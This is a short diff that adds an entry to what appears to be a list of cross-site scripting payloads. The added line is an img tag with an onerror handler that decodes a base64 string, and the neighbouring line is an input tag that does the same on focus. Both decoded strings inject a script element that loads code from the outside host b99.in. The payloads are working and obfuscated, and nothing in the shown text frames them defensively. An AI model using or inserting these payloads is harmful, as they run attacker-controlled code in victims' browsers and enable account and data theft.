@@ -13,6 +13,10 @@
 ```
 
 ```
+<img src=x onerror=eval(atob`cz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNyYz0nLy9iOTkuaW4nO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocyk=`)>
+```
+
+```
 <input autofocus onfocus=eval(atob`cz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNyYz0nLy9iOTkuaW4nO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocyk=`)>
 ```
 
